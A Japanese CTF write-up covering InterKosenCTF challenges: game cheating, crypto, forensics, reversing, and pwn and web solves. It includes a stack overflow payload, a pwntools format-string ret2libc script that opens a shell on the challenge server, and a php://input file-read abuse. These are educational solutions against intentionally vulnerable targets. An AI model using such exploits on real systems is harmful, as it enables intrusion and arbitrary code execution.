---
layout: post
title: InterKosenCTF の write-up
categories: [ctf]
date: 2019-01-21 03:15:00 +0900
---

ひとりチーム [Hirota Sora](https://www.hai-furi.com/character/04_06/) で [InterKosenCTF](https://www.kosenctf.com/) に参加しました。最終的に 16 問を解いて 2550 点を獲得し、順位は 1 点以上を獲得した 70 チーム中 2 位でした。

以下、解いた問題の write-up です。

## [Cheat 100] lights out

> Turn all the lights on.
> 添付ファイル: lights_out.tar.gz

与えられた `lights_out.tar.gz` を展開すると以下のようなファイルが出てきました。

```
>file LightsOut.exe
LightsOut.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

.NET アプリケーションのようです。実行するとライツアウトの盤面が表示されました。

![ライツアウト](../images/2019-01-20_1.png)

dnSpy を使うとデコンパイルすることができました。ぼーっとデコンパイルされた結果を眺めていると、盤面をクリアしているかどうか判定しているコードが見つかりました。

```csharp
// 햎.햎
// Token: 0x06000004 RID: 4 RVA: 0x00002358 File Offset: 0x00000558
private void 헡()
{
	for (int i = 0; i < 20; i++)
	{
		for (int j = 0; j < 20; j++)
		{
			if (!this.햎[i, j])
			{
				return;
			}
		}
	}
	MessageBox.Show(745BBE96-A34C-4723-B7D4-089F48D57F2E.헡(), 745BBE96-A34C-4723-B7D4-089F48D57F2E.헋(), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
}
```

Edit IL Instructions によって IL を `idc.i4.s 20` から `idc.i4.s 0` に編集しループの回数を 20 回から 0 回に減らすと、一度盤面をクリックしただけでフラグを手に入れることができました。

![フラグ](../images/2019-01-20_2.png)

```
KOSENCTF{st4tic4lly_d3obfusc4t3_OR_dyn4mic4lly_ch34t}
```

## [Cheat 150] spaceship

> Get a super good score!
> 添付ファイル: spaceship.apk

Android 向けの apk ファイルが与えられました。Android エミュレータにインストールして実行してみます。

![spaceship](../images/2019-01-20_3.png)

シューティングゲームのようです。とりあえず zip として展開してみると、`assets/game.droid` というゲームのスクリプトや画像などが格納されているファイルが見つかりました。フラグが見つからないかなーという気持ちで `strings` にかけてみると、以下のように `others.kosenctf.com` というドメイン名らしき文字列が見つかりました。

```
>strings -tx game.droid | grep kosenctf
   792a others.kosenctf.com
```

他にも `tcpInit` のような文字列も含まれており、このゲームは `others.kosenctf.com` となんらかの通信を行うのではという推測ができます。

Wireshark を立ち上げて `others.kosenctf.com` との通信をキャプチャしながらゲームを遊んでみると、ゲームオーバー時に以下のようなパケットが投げられていました。

```
0000   53 50 53 54 07 00 00 00 08 75 73 65 72 6e 61 6d
0010   65
```

`SPST` + スコア (4 バイト) + ユーザ名の文字数 (1 バイト) + ユーザ名 という構造になっているようです。非常に大きなスコアを投げてみるとフラグが得られました。

```
$ python2 -c "import sys; sys.stdout.write('SPST\x12\x34\x56\x78\4test')" | nc others.kosenctf.com 11200
{"response":"KOSENCTF{0nlin3_ch34t_by_f4k3_p4ck3t}"}
```

```
KOSENCTF{0nlin3_ch34t_by_f4k3_p4ck3t}
```

## [Cheat 250] anti cheat

> Get a super good score!
> challenge (リンク)

与えられた URL にアクセスすると、Block & Balance という JavaScript 製のゲームが表示されました。これは GameMaker Studio によって出力されており、JavaScript のコードは巨大で読みにくいものとなっています。

`PRESS <SPACE> TO RESTART` のように画面上に出力される文字列を探してみると、この前後に以下のような処理が見つかりました。

```javascript
...function _N1(_Y2,_Z2){_Y2._H3="HLPFM@WExaBPJ`\\avW";_Y2._I3="\\PWqLmd\\BmWJ\\`kFBW~";};}function _O1(_Y2,_Z2){if((global._h3==1)){if((_e3._r3>=1000)){_b3(16776960);_a3(1);_J3(1);_c3(0);_d3((_e3._f3/2),(_e3._K3/2),_U(_Y2,_Z2,_Y2._H3));_d3((_e3._f3/2),((_e3._K3/2)+64),_U(_Y2,_Z2,_Y2._I3));_J3(0);}else {_b3(16777215);_a3(1);_J3(1);_c3(0);_d3((_e3._f3/2),(_e3._K3/2),"GAMEOVER");_J3(0);_c3(1);_d3((_e3._f3/2),((_e3._K3/2)+32),"PRESS <SPACE> TO RESTART");};};};}...
```

`HLPFM@WExaBPJ…` という怪しげな文字列が気になります。`KOSENCTF{` と xor をしてみましょう。

```
>python2
>>> s = "HLPFM@WExaBPJ`\\avW"
>>> [ord('a') ^ ord('b') for a, b in zip(s[:9], "KOSENCTF{")]
[3, 3, 3, 3, 3, 3, 3, 3, 3]
```

どうやらこの文字列は `3` と xor されたフラグだったようです。デコードしてフラグの全体を入手しましょう。

```
>>> s = "HLPFM@WExaBPJ`\\avW"
>>> t = "\\PWqLmd\\BmWJ\\`kFBW~"
>>> ''.join(chr(ord(c) ^ 3) for c in s + t)
'KOSENCTF{bASIc_buT_STrOng_AnTI_chEAT}'
```

```
KOSENCTF{bASIc_buT_STrOng_AnTI_chEAT}
```

## [Crypto 100] strengthened

> If you choose a tiny e as an RSA public exponent key, it may have the Low Public Exponent Attack vulnerability. So, I strengthened it.
> 添付ファイル: strengthened.tar.gz

以下のようなソースコードが与えられました。

```python
from Crypto.PublicKey import RSA
from flag import flag

assert(flag.startswith("KOSENCTF"))

m = int(flag.encode("hex"), 16)
key = RSA.generate(2048, e=3)

while pow(m, key.e) < key.n:
    m = m << 1

print('m=', m)
print('---')

c = pow(m, key.e, key.n)
print("c={}".format(c))
print("e={}".format(key.e))
print("n={}".format(key.n))
```

3 乗根をとればよさそうに見えますが、`while pow(m, key.e) < key.n: m = m << 1` されているのでダメそうです。平文が左シフトされていることを利用しましょう。

```python
import gmpy

c = 4463460595992453701248363487821541441150903755360725278018226219397401710363861496059259094224390706180220952190225631877998805079875092397697611750633506584765344462795005248071815365597632474605092833538433542560077911683343354987797542811482161587946052311886487498036017642286567004537026772476444248546454191809039364154237333857544244714476659565633430727987398093807535598721617188645525580904749313860179445486488885745360135318781538863153023533787846418930231495508425497894530548826950697134882405386297339090051713047204435071147720540765043175338026604739425761557904004394283569956586190646684678673053
e = 3
n = 20169655945950105431738748243853927780331001640334986437959982160666610494142435056640595584712525268749025697813786742196769781107156600305882353438821338449740459508913799371467499117044809895128843358770212122149984787048869330121794532368786611513049229117856338074267497697268551262926233194699624069306801634627577488539763083043246322479538731125975155062918653790730355348606063864283452838775795802376825160728197871502803176167192178252802683495999009932194712635685410904731513241097681486329083486997949127983471617545787155883408710148611375930619822455594408723266661117411592239721104309931413551856711

s = hex(gmpy.root((gmpy.invert(2 ** 3, n) * c) % n, e)[0])[2:]
print s[:s.index('0000')].decode('hex')
```

```
$ python2 solve.py
KOSENCTF{THIS_ATTACK_DOESNT_WORK_WELL_PRACTICALLY}
```

```
KOSENCTF{THIS_ATTACK_DOESNT_WORK_WELL_PRACTICALLY}
```

## [Crypto 150] Oh my Hash

> challenge (リンク)
> 添付ファイル: oh_my_hash.tar.gz

`oh_my_hash.tar.gz` を展開すると、以下のようにソースコードが得られました。

`app.py` (Web アプリ部分)

```python
from flask import Flask, render_template, session, make_response, request, flash, redirect, url_for
from secret import SALT, ADMIN_PASSWORD, SECRET_KEY, FLAG
from myhash import myhash

g = {}
g['users'] = {"admin": myhash((SALT + ADMIN_PASSWORD).encode())}
g['tokens'] = {
    myhash((SALT + "admin").encode()).decode(): "admin"
}
app = Flask(__name__)
app.secret_key = SECRET_KEY

@app.route('/')
def index():
    if 'user' in session:
        return render_template('user.html', user=session['user'], flag=FLAG)

    token = request.cookies.get('remember_token')
    if token and token in g['tokens']:
        session['user'] = g['tokens'][token]
        resp = make_response(render_template('user.html', user=session['user'], flag=FLAG))
        resp.set_cookie('remember_token', value='', expires=0)
        return resp

    return render_template('index.html')

@app.route('/register', methods=['POST'])
def register():
    if request.method == 'POST':
        if 'user' in session:
            flash('you are already logged in', 'danger')
            return redirect(url_for('index'))

        name = request.form.get('name')
        password = request.form.get('password')

        if not name or not password:
            flash('username and password are required', 'danger')
            return redirect(url_for('index'))

        if name == "admin":
            flash('forbid to register as admin', 'danger')
            return redirect(url_for('index'))

        g['users'][name] = myhash((SALT + password).encode())
        flash('register succeeded', 'success')

    return redirect(url_for('index'))

@app.route('/login', methods=['POST'])
def login():
    if request.method == 'POST':
        if 'user' in session:
            flash('you are already logged in', 'danger')
            return redirect(url_for('index'))

        name = request.form.get('name')
        password = request.form.get('password')

        if not name or not password:
            flash('username and password are required', 'danger')
            return redirect(url_for('index'))

        if name in g['users'] and myhash((SALT + password).encode()) == g['users'][name]:
            session['user'] = name
            flash('login succeeded', 'success')
            resp = make_response(redirect(url_for('index')))
            if request.form.get('remember'):
                token = myhash((SALT + name).encode()).decode()
                if token not in g['tokens'].keys():
                    g['tokens'][token] = name
                resp.set_cookie('remember_token', value=token, max_age=60*60*24)
            return resp
        else:
            flash('login failed {}'.format(name), 'danger')

    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.pop('user', None)
    resp = make_response(redirect(url_for('index')))
    resp.set_cookie('remember_token', value='', expires=0)
    return resp


if __name__ == '__main__':
    app.run(host="0.0.0.0", port="5000")
```

`myhash.py` (独自のハッシュ関数)

```python
import functools
import binascii


def myhash(message):
    xs = myhash_impl(message)
    return binascii.hexlify(functools.reduce(lambda x, y: x + y, [x.to_bytes(4, 'big') for x in xs]))

def myhash_impl(message, iv=(0xDEADBEEF, 0xCAFEBABE, 0x00C0FFEE, 0x5017B047)):
    # add padding
    l = (64 - len(message)) % 64
    message += l.to_bytes(1, 'big') * l

    A, B, C, D = iv

    f = lambda x, y: (((x<<1)^(y>>5)) ^ ((x>>16)|(y<<16))) & 0xFFFFFFFF
    g = lambda x, y: ((x<<4) | ((y << 1) ^ (y >> 10))) & 0xFFFFFFFF
    h = lambda x, y: (x|y) ^ (x&y)

    for i in range(0, len(message), 16):
        a = int.from_bytes(message[i:i+4], 'big')
        b = int.from_bytes(message[i+4:i+8], 'big')
        c = int.from_bytes(message[i+8:i+12], 'big')
        d = int.from_bytes(message[i+12:i+16], 'big')

        A = f(g(B, a), h(C, d))
        B = f(g(C, b), h(D, a))
        C = f(g(D, c), h(A, b))
        D = f(g(A, d), h(B, c))

    return [A, B, C, D]
```

Cookie にセットされる `remember_token` で独自のハッシュ関数である `myhash` が使われています。`admin` の `remember_token` を入手し、Cookie にセットすればフラグが得られそうです。

`admin` 以外の好きなユーザ名で登録できるようなので、`admin` の 1 文字目を 1 ビットずつ変化させて登録し、そのアカウントの `remember_token` を確認してみましょう。

```
`dmin: 3dbd6c666db1e6ecbf391ff37622f30f
cdmin: bdbd48266da0fee8dd190fe16e26f3cf
edmin: 2d9f446765b1cefd95980fa35e32f24f
idmin: 1dac5c6e7db1aee08d11a7e33c8ef15f
qdmin: 3d3d6c664d31fef8bd1d4ee36f32f3cf
Admin: 3cbd4c662ca1eec8dd11afc35c0e634e
!dmin: 3db5c4626db3eef8151d0be37f27e347
```

ハッシュはごく一部しか変わっていません。これを利用して、ハッシュの各ビットについてそれぞれもっとも多いものを採用し、`admin` の `remember_token` を得られないか試してみましょう。

```python
# `dmin, cdmin, edmin, idmin, qdmin, Admin, !dmin
s = '''3dbd6c666db1e6ecbf391ff37622f30f
bdbd48266da0fee8dd190fe16e26f3cf
2d9f446765b1cefd95980fa35e32f24f
1dac5c6e7db1aee08d11a7e33c8ef15f
3d3d6c664d31fef8bd1d4ee36f32f3cf
3cbd4c662ca1eec8dd11afc35c0e634e
3db5c4626db3eef8151d0be37f27e347'''.splitlines()
s = [bin(int(c, 16))[2:].rjust(128, '0') for c in s]

res = ''
for i in range(128):
  cnt = 0
  for c in s:
    if c[i] == '0':
      cnt += 1
  res += '0' if cnt > 3 else '1'

print(hex(int(res, 2))[2:])
```

```
>python get_hash.py
3dbd4c666db1eee89d190fe37e26f34f
```

これを `remember_token` にセットすると `admin` としてログインでき、フラグを得ることができました。

```
KOSENCTF{PADDING_MAKES_THIS_MORE_VULNERABLE}
```

## [Forensics 50] attack log

> Someone seems to have tried breaking through our authentication. Find out if he or she made it to the end.
> 添付ファイル: attack_log.tar.gz

`attack_log.tar.gz` を展開すると `attack_log.pcapng` というパケットのログファイルが出てきました。

Wireshark で開いてみると `www.kosenlab.org` に対して Basic 認証でブルートフォースを行っている様子が見られました。ほとんどのレスポンスはステータスコードが 401 Unauthorized ですが、1 つだけ 200 OK とログインに成功しているものがあります。この通信のリクエストのヘッダである `Authorization: Basic a29zZW46YlJ1dDNGMHJjM1cwcmszRA==` を Base64 デコードするとフラグが得られました。

```
KOSENCTF{bRut3F0rc3W0rk3D}
```

## [Forensics 200] conversation

> We seized a smartphone which one of the suspects had used. Find out the conversation they had.
> 添付ファイル: android_8.1_x86_oreo.tar.gz

`android_8.1_x86_oreo.tar.gz` を展開すると `android_8.1_x86_oreo.img` というファイルが出てきました。どのようなファイルか確認してみましょう。

```
>file android_8.1_x86_oreo.img
android_8.1_x86_oreo.img: Linux rev 1.0 ext4 filesystem data, UUID=57f8f4bc-abf4-655f-bf67-946fc0f9f25b (needs journal recovery) (extents) (large files)
```

ファイルシステムのデータのようです。FTK Imager に投げてぼーっと見ていると、`/app/com.kosenctf.kosencrypto-(略)/base.apk` という怪しげな Android アプリケーションが見つかりました。zip として展開し、出てきた `classes.dex` を `dex2jar` によって jar に変換します。できた jar を JD-GUI に投げると、以下のようにデコンパイルができました。

`MainActivity.java`

```java
package com.kosenctf.kosencrypto;

import android.app.Activity;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import java.security.Key;
import java.security.spec.AlgorithmParameterSpec;
import java.util.Base64;
import java.util.Base64.Encoder;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class MainActivity
  extends Activity
{
  private String algorithm = "AES/CBC/PKCS5Padding";
  private String iv = "str0ng-s3cr3t-1v";
  private String key = "p4ssw0rd-t0-hid3";
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    setContentView(2131296284);
    ((Button)findViewById(2131165218)).setOnClickListener(new View.OnClickListener()
    {
      public void onClick(View paramAnonymousView)
      {
        String str = ((EditText)MainActivity.this.findViewById(2131165277)).getText().toString();
        try
        {
          paramAnonymousView = Cipher.getInstance(MainActivity.this.algorithm);
          Object localObject1 = new javax/crypto/spec/SecretKeySpec;
          ((SecretKeySpec)localObject1).<init>(MainActivity.this.key.getBytes(), MainActivity.this.algorithm);
          Object localObject2 = new javax/crypto/spec/IvParameterSpec;
          ((IvParameterSpec)localObject2).<init>(MainActivity.this.iv.getBytes());
          paramAnonymousView.init(1, (Key)localObject1, (AlgorithmParameterSpec)localObject2);
          localObject2 = (EditText)MainActivity.this.findViewById(2131165226);
          localObject1 = new java/lang/String;
          ((String)localObject1).<init>(Base64.getEncoder().encode(paramAnonymousView.doFinal(str.getBytes())));
          ((EditText)localObject2).setText((CharSequence)localObject1);
        }
        catch (Exception paramAnonymousView)
        {
          ((EditText)MainActivity.this.findViewById(2131165226)).setText("Failed in encrypting the plaintext.");
        }
      }
    });
  }
}
```

AES で何かを暗号化しているようです。

`android_8.1_x86_oreo.img` をバイナリエディタで開いて `kosen` のようなそれっぽい文字列で検索してみると、`Jiro Kosen GVuIBG/lSSUNW6jZqR20hw== ... bugle://avatar/l?n=Jiro%20Kosen&i=0r1-3B394B453D454D31430r1-3B394B453D454D3143001234567892` というそれっぽいバイト列が見つかりました。`/avatar/` でさらに検索すると `pwgh/nXO1tMf6TXUd99mhNH01GcCqVDxDBy1+sDf37s4nnYRuHkS+AOoiH3DmKU3I+ZYHEsllcwlnm6FWjAb5g==` というそれっぽい長さの暗号化されたメッセージが見つかりました。これを復号してみましょう。

```
$ python2
>>> from Crypto.Cipher import AES
>>> AES.new('p4ssw0rd-t0-hid3', AES.MODE_CBC, 'str0ng-s3cr3t-1v').decrypt('pwgh/nXO1tMf6TXUd99mhNH01GcCqVDxDBy1+sDf37s4nnYRuHkS+AOoiH3DmKU3I+ZYHEsllcwlnm6FWjAb5g=='.decode('base64'))
'The flag is KOSENCTF{7h3_4r7_0f_4ndr01d_f0r3n51c5}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'
```

フラグが得られました。

```
KOSENCTF{7h3_4r7_0f_4ndr01d_f0r3n51c5}
```

## [Pwn 100] double check

> nc pwn.kosenctf.com 9100
> 添付ファイル: double_check.tar.gz

`double_check.tar.gz` を展開すると、`auth` という 32 ビットの ELF ファイルとそのソースコードである `auth.c` が出てきました。

`auth.c`

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

char auth = 1;
char password[32];

void handler(int sig)
{
  if (sig == SIGALRM) {
    puts("\nTimeout.");
    exit(1);
  }
}

void init(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  signal(SIGALRM, handler);
  alarm(5);
}

void sw(char flag)
{
  auth = flag;
}

char readfile(char* path, char* buf)
{
  FILE *fp;
  if (auth == 1) {
    fp = fopen(path, "r");
    fread(buf, 1, 31, fp);
    fclose(fp);
    buf[31] = 0;
    auth = 0;
  } else {
    return 1;
  }
  return 0;
}

int main(void)
{
  FILE *fp;
  char input[32];

  init();
  
  if (readfile("password", password)) {
    puts("The file is locked.");
    return 1;
  }
  
  printf("Password: ");
  scanf("%s", input);

  if (strncmp(password, input, 31) == 0) {
    sw(1);
  } else {
    sw(0);
  }
  
  if (strncmp(password, input, 31) == 0) {
    if (readfile("flag", password)) {
      puts("The file is locked.");
    } else {
      printf("%s\n", password);
    }
  } else {
    puts("Invalid password.");
  }

  memset(password, '\x00', 32);
  return 0;
}
```

`scanf("%s", input);` でスタックバッファオーバーフローができます。リターンアドレスを `readfile("flag", password)` に変えればよさそうですが、そのままでは (パスワードが一致していないため) 事前に `sw(0)` されてしまい、フラグを表示させることができません。`sw(1)` したあと `readfile("flag", password)` を呼び出すようにしてみましょう。

```
$ python2 -c "import sys; sys.stdout.write('A' * 44 + '\x00\x87\x04\x08' + '\x3f\x88\x04\x08' + '\1\0\0\0\n')" | nc pwn.kosenctf.com 9100
Password: Invalid password.
KOSENCTF{s1mpl3-st4ck0v3rfl0w!}
/home/pwn/redir.sh: line 2:   363 Segmentation fault      (core dumped) ./auth
```

フラグが得られました。

```
KOSENCTF{s1mpl3-st4ck0v3rfl0w!}
```

## [Pwn 200]introduction

> nc pwn.kosenctf.com 9200
> 添付ファイル: introduction.tar.gz

`introduction.tar.gz` を展開すると、`introduction` という 32 ビットの ELF ファイルとそのソースコードである `introduction.c` 、そしてサーバで使われている `libc-2.27.so` が出てきました。

`introduction.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

void handler(int sig)
{
  if (sig == SIGALRM) {
    puts("\nNo need to answer my question. Bye.");
    exit(1);
  }
}

void init(void)
{
  setvbuf(stdout, NULL, _IONBF, 0);
  signal(SIGALRM, handler);
  alarm(5);
}

int main(void)
{
  char buffer[128];
 
  init();
  puts("May I ask your name?");
  printf("First Name: ");
  scanf("%127s", buffer);
  printf(buffer);
  printf("\nFamily Name: ");
  scanf("%127s", buffer);
  printf(buffer);
  puts("\nThanks.");
  return 0;
}
```

`printf(buffer);` とユーザ入力をそのまま `printf` に渡しており、これによってスタックの内容を読んだり好きなアドレスを書き換えられたりできそうです。

1. スタック上の `buffer` のアドレスと、libc 上の `__libc_start_main+241` のアドレスをリーク
2. 得られたアドレスから `main` からのリターンアドレスと libc がロードされているアドレスを計算
3. `main` からのリターンアドレスを `system` に、またリターンアドレス + 8 を `/bin/sh` に書き換える

という手順でシェルを起動させましょう。

```python
from pwn import *
from libformatstr import FormatStr

context(arch='i386', os='linux')

offset_libc_start_main_241 = 0x18e81 
offset_system = 0x3cd10
offset_sh = 0x17b8cf

s = remote('pwn.kosenctf.com', 9200)

s.readuntil(': ')
s.sendline('%1$x.%43$x') # input addr, <__libc_start_main+241>
res = s.recvline()
print repr(res)

addr_buf = int(res.split('.')[0], 16)
addr_ret = addr_buf + 144
libc_base = int(res.split('.')[1], 16) - offset_libc_start_main_241
print hex(libc_base)

p = FormatStr()
p[addr_ret] = libc_base + offset_system
p[addr_ret + 8] = libc_base + offset_sh

s.readuntil(': ')
s.sendline(p.payload(7))

s.interactive()
```

```
$ python2 solve.py
...
Thanks.
$ ls
flag
introduction
redir.sh
$ cat flag
KOSENCTF{lIbc-bAsE&ESp_lEAk+rET2lIbc_ThrOugh_FSB}
```

フラグが得られました。

```
KOSENCTF{lIbc-bAsE&ESp_lEAk+rET2lIbc_ThrOugh_FSB}
```

## [Reversing 100] flag generator

> This program generates the flag for you!!
> 添付ファイル: flag_generator.tar.gz

`flag_generator.tar.gz` を展開すると `main` という 64 ビットの ELF が出てきました。

IDA Pro の Freeware Version を使って解析すると、まず `r` という以下のような関数が見つかりました。

```c
int s;
int r(void) {
  s = (s * 0x41c64e6d + 0x3039) & 0x7fffffff;
  return s;
}
```

`main` 中ではこの関数を利用して `s = time(NULL)` をしたあとの `r()` が `0x25dc167e` と等しければそこからフラグの出力を始めるという処理を行っています。

Z3Py を利用して、この条件が成立する時刻を探します。

```python
from z3 import *
s = BitVec('s', 32)
solve((s * 0x41c64e6d + 0x3039) & 0x7fffffff == 0x25dc167e)
```

```
>python2 itsudesuka.py
[s = 1509961785]
```

`1509961785` であることがわかりました。

フラグを出力させることができるよう、`time()` の返り値を自由に変更できるようにしてみます。

```c
#include <stdlib.h>
int time(int t) {
  return atoi(getenv("TIMEEE"));
}
```

`gcc -shared -fPIC -o time.so time.c` でコンパイルし、`TIMEEE=1509961785 LD_PRELOAD=./time.so ltrace ./main` を実行するとフラグが得られました。

```
$ TIMEEE=1509961785 LD_PRELOAD=./time.so ltrace ./main
time(0)                                                                                                                = 1509961785
printf("%s", "KOSE")                                                                                                   = 4
sleep(1)                                                                                                               = 0
printf("%s", "NCTF\001")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "{IS_\002")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "THIS\003")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "_REA\004")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "LLY_\005")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "A_RE\006")                                                                                               = 5
sleep(1)                                                                                                               = 0
printf("%s", "VERS\a")                                                                                                 = 5
sleep(1)                                                                                                               = 0
printf("%s", "ING?\b")                                                                                                 = 5
sleep(1)                                                                                                               = 0
printf("%s", "}")                                                                                                      = 1
```

```
KOSENCTF{IS_THIS_REALLY_A_REVERSING?}
```

## [Reversing 200] flag checker

> You should check your flag before your submission.
> 添付ファイル: flag_checker.tar.gz

`flag_checker.tar.gz` を展開すると `main` という 64 ビットの ELF が出てきました。

IDA Pro の Freeware Version を使って解析し、手でデコンパイルしてみると以下のような処理を行っていることがわかりました。

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>   // for uint32_t
#include <limits.h>   // for CHAR_BIT

/* https://stackoverflow.com/questions/776508/best-practices-for-circular-shift-rotate-operations-in-c */
#define BitsCount( val ) ( sizeof( val ) * CHAR_BIT )
#define Shift( val, steps ) ( steps % BitsCount( val ) )
#define ROL( val, steps ) ( ( val << Shift( val, steps ) ) | ( val >> ( BitsCount( val ) - Shift( val, steps ) ) ) )
#define ROR( val, steps ) ( ( val >> Shift( val, steps ) ) | ( val << ( BitsCount( val ) - Shift( val, steps ) ) ) )

unsigned char encrypted[] = {
  159, 201, 215, 194, 10, 70, 68, 89, 132, 197, 206, 193, 63, 79, 95, 78, 190, 212, 222, 221, 57, 75, 74, 76, 166, 207, 209, 209, 41, 85, 74, 78, 163, 195, 195, 221
};

void h(char *s, unsigned char **result) {
  int len, padlen, i;
  unsigned char *dest;

  unsigned int var_1c, var_18;
  int j;

  len = strlen(s);
  padlen = 4 - len % 4;
  dest = malloc(len + padlen);
  *result = malloc(len + padlen);
  strncpy(dest, s, len);

  for (i = len; i < (len + padlen); i++) {
    dest[i] = (unsigned char) padlen;
  }

  var_1c = 0xDEC0C0DE;
  var_18 = 0;
  j = (len + padlen) / 4 - 1;
  while (j >= 0) {
    var_18 ^= ((unsigned int *)dest)[j] ^ var_1c;
    var_1c = ROL(var_1c, 8);
    ((unsigned int *) *result)[j] = var_18;
    j--;
  }

  free(dest);

  return;
}

int check(unsigned char *input) {
  int result, i;
  unsigned char *s;
  unsigned char *encrypted_;

  encrypted_ = encrypted;
  h(input, &s);
  result = 1;

  for (i = 0; i < strlen(s); i++) {
    if (s[i] != encrypted_[i]){
      result = 0;
      break;
    }
  }

  free(s);

  return result;
}

int main(int argc, char **argv) {
  if (argc == 1) {
    puts("No flag is provided.");
    return 1;
  }

  if (check(argv[1]) == 1) {
    puts("This is a flag.");
  } else {
    puts("This is not a flag.");
  }

  return 0;
}
```

`0xDEC0C0DE` をくるくるローテートさせながら、直前に処理したブロックの内容も使ってエンコードしているようです。Z3Py を使って雑に文字列を復元しましょう。

```python
from z3 import *

def rol(x, s):
  return ((x << s) | ((x & (0xffffffff << (32 - s))) >> (32 - s))) & 0xffffffff

flag = [BitVec('flag_%d' % i, 32) for i in range(9)]
encrypted = [3268921759, 1497646602, 3251553668, 1314869055, 3722368190, 1279937337, 3520188326, 1313494313, 3720594339]
result = [0 for _ in range(9)]

solver = Solver()
var_1c = 0xDEC0C0DE
var_18 = 0
for i in range(8, -1, -1):
  var_18 ^= flag[i] ^ var_1c
  var_1c = rol(var_1c, 8)
  result[i] = var_18

for a, b in zip(result, encrypted):
  solver.add(a == b)

r = solver.check()
m = solver.model()
res = ''
for c in flag:
  res += hex(m[c].as_long())[2:].zfill(8).decode('hex')[::-1]

print res
```

```
>python2 solve.py
KOSENCTF{TOO_EASY_TO_DECODE_THIS}
```

フラグが得られました。

```
KOSENCTF{TOO_EASY_TO_DECODE_THIS}
```

## [Web 100] Gimme Chocolate

> challenge (リンク)

与えられた URL にアクセスすると、以下のようなソースコードで動いているアプリケーションが表示されました。

```php
<?php

// This function evaluates a source code which is similar to brainf*ck.
// However, looking into the details, there are some differences. Be careful!
function bf($code) {
    $ARRSIZE = 10000;
    $STEPSIZE = 100000;
    $p = 0;
    $jp = 0;
    $jbuf = [];
    $mp = 0;
    $mem = array_fill(0, $ARRSIZE, 0);
    $obuf = "";
    
    for ($s = 0; $s < $STEPSIZE && $p < strlen($code); $s++) {
        $c = $code[$p];
        if ($c === '>') {
            $mp = ($mp + 1 + $ARRSIZE) % $ARRSIZE;
        } else if ($c === '<') {
            $mp = ($mp - 1 + $ARRSIZE) % $ARRSIZE;
        } else if ($c === '+') {
            $mem[$mp] = $mem[$mp] + 1;
        } else if ($c === '-') {
            $mem[$mp] = $mem[$mp] - 1;
        } else if ($c === '[') {
            $jbuf[$jp] = $p;
            $jp++;
        } else if ($c === ']') {
            if ($mem[$mp] == 0) {
                $jp--;
            } else {
                $p = $jbuf[$jp-1];
            }
        } else if ($c === '.') {
            $obuf .= chr($mem[$mp]);
        }
        $p++;
    }

    return $obuf;
}

if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die;
}

$prefix = __DIR__. DIRECTORY_SEPARATOR . 'codes';
if (!is_dir($prefix)) {
    mkdir($prefix);
}

$errs = [];
$msgs = [];
$r = "";
do {
    if (isset($_POST['save'])) {
        if (!isset($_POST['name']) || empty($_POST['name'])) {
            $errs []= 'filename required';
            break;
        }
        if (!preg_match('@^[A-Za-z0-9_]+$@', $_POST['name'])) {
            $errs []= 'invalid filename';
            break;
        }

        if (!isset($_POST['code']) || empty($_POST['code'])) {
            $errs []= 'code required';
            break;
        }

        $fp  = fopen($prefix.DIRECTORY_SEPARATOR.$_POST['name'], 'w');
        if ($fp === FALSE || fwrite($fp, $_POST['code'], 100) === FALSE) {
            $errs []= 'Unexpected error. Please contact the admin.';
            break;
        }
        fclose($fp);

        $msgs []= 'SAVED';
    }
    else if (isset($_GET['execute'])) {
        $code = file_get_contents($_GET['file']);
        if ($code === FALSE) {
            $errs []= 'Could not open the source file.';
            break;
        }
        $r = bf($code);
        if ($r === "Give Me a Chocolate!!") {
            $msgs []= include(dirname(__DIR__).DIRECTORY_SEPARATOR.'flag.php');
        }
    }
} while(false);


$files = glob($prefix.DIRECTORY_SEPARATOR.'*');
usort($files, function($a, $b){
  return filemtime($a) < filemtime($b);
});
$files = array_slice($files, 0, 10);

?>

(略)
```

Brainfuck のコードを投稿し実行できるサービスのようです。`Give Me a Chocolate!!` を表示する Brainfuck コードを 100 文字以内で書くことができればフラグが得られるようですが、非現実的です。

Brainfuck のコードを実行する際にファイルを取得している箇所を見てみましょう。

```php
<?php
...
    else if (isset($_GET['execute'])) {
        $code = file_get_contents($_GET['file']);
        if ($code === FALSE) {
            $errs []= 'Could not open the source file.';
            break;
        }
        $r = bf($code);
        if ($r === "Give Me a Chocolate!!") {
            $msgs []= include(dirname(__DIR__).DIRECTORY_SEPARATOR.'flag.php');
        }
    }
...
```

ユーザ入力をそのまま `file_get_contents` に投げ、その内容を実行しています。このときに参照されるファイルをユーザが自由に操作できるものにすれば、100 文字より多い Brainfuck のコードを実行させることができそうです。

`php://input` を使えばリクエストの body を読み込ませることができます。`/?execute&file=php://input` に対して `Give Me a Chocolate!!` を表示する Brainfuck コードを POST してみましょう。

```
>curl "http://web.kosenctf.com:8100/?execute&file=php://input" -d "++++++++[>++>+++>++++>+++++>++++++>+++++++>++++++++>+++++++++>++++++++++>+++++++++++>++++++++++++>+++++++++++++>++++++++++++++<<<<<<<<<<<<<-]++++++++>>>>>>>>-.>>>>+.>++++++.<----.<<<<<<<<<.>>>>>>---.>>>.<<<<<<<<<.>>>>>>>>+.<<<<<<<<.>>>>+++.>>>>>+++.+++++++.<++.>.---.<--.>>--.<<++++.<<<<<<<<+.."
...
